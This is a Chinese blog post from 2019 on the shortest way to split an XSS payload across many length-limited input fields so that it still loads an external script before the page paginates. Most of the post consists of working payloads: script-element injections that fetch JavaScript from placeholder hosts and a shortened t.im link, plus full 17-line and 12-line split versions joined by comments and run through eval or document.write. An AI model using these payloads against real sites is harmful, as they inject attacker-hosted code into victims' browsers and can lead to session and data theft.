---
title: XSS 最短拆分
categories:
  - Web安全
tags:
  - xss
abbrlink: aa9bb52b
date: 2019-03-11 21:51:42
---
&#8195;&#8195;XSS 中拆分法是绕过长度限制最常用的一种方法，那最短多少行能实现？实际环境中数据太多经常会有翻页的功能，比如邮件列表，发帖回帖，如果输入的可控长度小于 15 字符，超过五行就强行闭合标签并翻页的话，就算存在 XSS 基本上也无法引用外部 JS ，这也是研究最短行数实现外部 JS 引用的意义。
<!-- more -->

&#8195;&#8195;引用外部 JS 常用 payload 如下：
```
<input name="" value="" onmouseover="s=document.createElement('script');s.src='//xxxx.com/xxx/xxx.js';document.body.appendChild(s)">

<script>var x="with(document)body.appendChild(createElement('script')).src='//xxxxxxx.com/xxxx/xxxx.js'";eval(x);</script>
```
&#8195;&#8195;拆分的行数主要受可控字符的长度限制，**如果我们可控输入是 15 字符，实际有效的可控字符其实只有 5 个** ，如 `*/x+="xxxx";/*` ，固定字符就占了 10 个，这种情况想要拆分如上第二个 payload 需要差不多 27 行，如果 15 行就会翻页呢？这就需要尽可能的缩短 payload ，可以用 **短网址** 来实现。
&#8195;&#8195;短网址生成的方式很多，百度、新浪等都提供这种服务，但我比较了下生成最短的是 [T.IM 短网址/短链接生成器](http://t.im/)，路径部分只有 4 位，形如 `http://t.im/abcd`，现在上面第二个 payload 就可以压缩到 17 行，如下：
```
<script>var x/*
*/="with(do";/*
*/x+="cumen";/*
*/x+="t)bod";/*
*/x+="y.app";/*
*/x+="endCh";/*
*/x+="ild(c";/*
*/x+="reate";/*
*/x+="Eleme";/*
*/x+="nt('s";/*
*/x+="cript";/*
*/x+="')).s";/*
*/x+="rc='/";/*
*/x+="/t.im";/*
*/x+="/abcd";/*
*/x+="'";eval/*
*/(x);</script>
```
&#8195;&#8195;还有一种更短的方式，payload 如下：
```
<script src='//t.im/abcd'></script>
```
&#8195;&#8195;使用短地址后可以压缩到 12 行，如下：
```
<script>var a/*
*/,b,c,d,e,f;/*
*/a="<scrip";/*
*/b="t src=";/*
*/c="//t.im";/*
*/d="/ddux";/*
*/e="></scr";/*
*/f="ipt>";/*
*/document./*
*/write(a+b/*
*/+c+d+e+f)/*
*/;</script>
```
&#8195;&#8195;这种方式有个缺陷就是 `document` 不能再拆分，算上注释符理论上可控输入不能小于 12 个字符。小于 12 字符的我倒没见过，但是万一诸如点在 `X-Forwarded-For` 呢？然后开发为了方便直接写死了长度 16 位 。
&#8195;&#8195;如何判断多少行翻页呢？F12 查看元素并不准确，火狐倒还比较准确，chrome 目前是不准确的，因为数据太多时候 chrome 会省略掉一部分元素，虽然看不见但却存在。可以查看网页源代码，或者控制台用 `document.scripts[15].innerHTML` 打印出来。

